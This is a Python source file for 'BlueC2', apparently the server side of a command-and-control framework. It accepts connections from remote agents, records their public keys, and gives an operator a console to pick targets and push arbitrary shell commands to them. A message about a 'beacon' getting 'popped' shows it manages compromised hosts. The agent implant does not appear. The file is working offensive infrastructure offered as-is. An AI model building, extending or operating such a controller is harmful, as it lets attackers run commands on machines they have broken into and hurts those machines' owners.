#!/usr/bin/python3

import socket,threading,re,rsa
from agent import Agent

IP_REGEX = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'

class BlueServer:

    __slots__ = ["ip","port","targets","connections","running","sock","agent_count"]

    def __init__(self,port):
        self.port = port
        self.connections = []
        self.targets = []
        self.ip = None
        self.running = False 
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(('0.0.0.0',self.port))
        self.sock.listen(10) #sets backlog to 10
        self.agent_count = 0

    def handle_command(self,userin):
        splits = userin.split(" ") #splits userinput on each space
        if userin.upper() == "QUIT" or userin.upper() == 'Q':
            validate = input("Confirmation required: are you sure you want to quit? (y/n)\n")
            if validate.upper() in ["YES","Y"]:
                self.stop()
            else:
                print("Cancelling QUIT command")
        elif userin.upper() == "HELP" or userin == "?":
            self.help()
        elif splits[0].upper() == "SET":
            #Handles setting information
            if splits[1].upper() == "HELP":
                self.set_help()
            elif splits[1].upper() == "TARGETS":
                self.targets = []
                targets = splits[2].split(",")
                for target in targets:
                    match = re.match(IP_REGEX,target)
                    if target in self.targets:
                        continue
                    elif match:
                        self.targets.append(self.ip_to_agent(target))
                    elif self.agentnum_to_agent(target) != None:
                        self.targets.append(self.agentnum_to_agent(target))
                    else:
                        print(target + " not a found connection")
            else:
                print("Invalid command, use SET HELP to see valid paramaters for SET")
        elif splits[0].upper() == "CMD":
            cmd = ' '.join(splits[1:])
            cmd = cmd.strip()
            cmd = "cmd|"+cmd
            for target in self.targets:
                try:
                    target.sock.send(cmd.encode())
                    reply = target.sock.recv(65535).decode()
                    print(str(target),reply,sep="\n")
                except UnicodeDecodeError:
                    print(str(target)+"\nERROR: Unicode Decode Error")
                except ConnectionResetError:
                    print(str(target)+f"\nERROR: Connection reset\nBeacon got popped :(\nRemoving Agent #{target.number} from connection list\n")
                    self.connections.remove(target)
                    self.targets.remove(target)
                except BrokenPipeError:
                    print(str(target)+f"\nERROR: Broken pipe error\n")
        elif userin.upper() in ["SHOW CONNECTIONS","SHOW CONNS"]:
            for conn in self.connections:
                if conn != self.connections[-1]:
                    print(str(conn),end=",")
                else:
                    print(str(conn))
        elif userin.upper() == "SHOW TARGETS":
            for target in self.targets:
                if target != self.targets[-1]:
                    print(str(target),end=",")
                else:
                    print(str(target))
        elif splits[0].upper() == "KILL":
            agents = splits[1].split(",")
            for a in agents:
                agent = self.agentnum_to_agent(a)
                self.connections.remove(agent)
                if agent in self.targets:
                    self.targets.remove(agent)
                agent.sock.shutdown(socket.SHUT_RDWR)
                agent.sock.close()
        else:
            print("Command does not exist\n")

    def start(self):
        self.running = True
        listener = threading.Thread(target=self.accept_connections, daemon=True)
        listener.start()
        #Command handler
        while self.running == True:
            userin = input("> ")
            self.handle_command(userin)
            
    def stop(self):
        self.running = False

    def help(self):
        #Displays help menu
        print("Commands: ")
        print("HELP\tDisplay this help menu")
        print("QUIT\tExit and shutdown server")
        print("SET <PARAMS>\tSets options for running program. Use SET HELP for more info")
        print("CMD <COMMAND>\tRuns a certain command on all selected targets")
        print("SHOW CONNECTIONS\tShows all connected agents")
        print("KILL <AGENT #>\tDisconnects specified agent")
        #print("SHELL <Agent # or IP>\tOpens an interactive shell on agent with specified IP")

    def set_help(self):
        #Smaller help menu specific to the SET command
        print("Usage: SET <ARG>")
        print("SET HELP\tDisplay this help menu")
        print("SET TARGETS <CSV list of target ips/agent #s>\tSets the targets to each target specified in a comma seperated list (Note: Overwrites previous targets)")

    def accept_connections(self):
        while self.running == True:
            sock,ip = self.sock.accept()
            pubkey_pem = sock.recv(4096)
            pubkey = rsa.PublicKey.load_pkcs1(pubkey_pem, format='PEM')
            self.agent_count+=1
            newAgent = Agent(self.agent_count,sock,ip,pubkey)
            self.connections.append(newAgent)

    def ip_to_agent(self,ip):
        for agent in self.connections:
            if agent.ipaddr == ip:
                return agent
        return None #null return if no agents match

    def agentnum_to_agent(self,agentnum):
        for agent in self.connections:
            if int(agent.number) == int(agentnum):
                return agent
        return None #null return if no agents match

def display_banner():
    try:
        with open("./banner.txt") as banner:
            print(''.join([line for line in banner]))
    except:
        print("Starting BlueC2...\n")
    print("\n")

def main():
    server = BlueServer(10267)
    display_banner()
    server.start()
    
if __name__ == "__main__":
    main()
